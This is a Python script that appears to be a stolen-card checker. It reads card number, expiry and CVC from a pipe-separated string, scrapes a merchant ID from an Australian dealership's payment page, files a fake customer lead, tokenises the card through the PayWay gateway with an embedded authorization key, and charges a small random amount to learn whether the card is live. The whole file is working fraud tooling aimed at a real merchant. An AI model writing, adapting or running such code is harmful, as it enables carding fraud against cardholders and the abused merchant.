import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	random_amount1 = random.randint(1, 9)
	random_amount2 = random.randint(1, 99)

	headers = {
	    'authority': 'www.penfold.com.au',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'referer': 'https://www.google.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	response = requests.get('https://www.penfold.com.au/online-payment', headers=headers)
	
	merchant_id = re.search(r'\\"merchant_id\\":\\"(.*?)\\"', response.text).group(1)
	
	headers = {
	    'authority': 'www.penfold.com.au',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'text/plain;charset=UTF-8',
	    'origin': 'https://www.penfold.com.au',
	    'referer': 'https://www.penfold.com.au/online-payment',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = '{"lead":{"dealership_slug":"559","website_slug":"penfold","url":"https://www.penfold.com.au/online-payment","source":"Website","user_agent":"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36","invoice_reference":"1","name":"Rodam User","amount":"'+str(random_amount1)+'.'+str(random_amount2)+'","email":"rodamuser08@gmail.com","phone":"6148 008 945","leadStatus":"Incomplete","form_completed":false,"category":"General Enquiry","subcategory":"Incomplete Payment","visited_pages":["/online-payment"],"linked_query_params":{}}}'
	
	response = requests.post('https://www.penfold.com.au/api/leads', headers=headers, data=data)
	
	id = response.json()['id']
	
	headers = {
	    'authority': 'api.payway.com.au',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'authorization': 'Basic UTQwNzcxX1BVQl9ycmVlNzNzZXp3aHNxdWNtZ2twNzIyNmQ0cXB2ZGhiaWhqNnJ0ZXViMmg5Mnh1YXduNDk2NDZtM2VkOGs6',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'origin': 'https://api.payway.com.au',
	    'referer': 'https://api.payway.com.au/rest/v1/creditCard-iframe.htm',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-no-authenticate-basic': 'true',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	data = {
	    'paymentMethod': 'creditCard',
	    'connectionType': 'FRAME',
	    'cardNumber': f'{n}',
	    'cvn': f'{cvc}',
	    'cardholderName': 'Dao Khao Saard',
	    'expiryDateMonth': f'{mm}',
	    'expiryDateYear': f'{yy}',
	    'threeDS2': 'false',
	}
	
	response = requests.post('https://api.payway.com.au/rest/v1/single-use-tokens', headers=headers, data=data)
	
	tok = response.json()['singleUseTokenId']
	
	headers = {
	    'authority': 'www.penfold.com.au',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/json',
	    'origin': 'https://www.penfold.com.au',
	    'referer': 'https://www.penfold.com.au/online-payment',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
	    'dealership_slug': '559',
	    'custom_amount': ''+str(random_amount1)+'.'+str(random_amount2)+'',
	    'customer': {
	        'email': 'rodamuser08@gmail.com',
	    },
	    'token': tok,
	    'merchant_id': merchant_id,
	    'order': {
	        'number': id,
	    },
	}
	
	response = requests.post(
	    'https://www.penfold.com.au/api/frizelle-st-george-payment',
	    headers=headers,
	    json=json_data,
	)
	
	x = response.text
	result = re.search(r'"status":"(.*?)"', x)
	result = result.group(1)
	
	return (result)
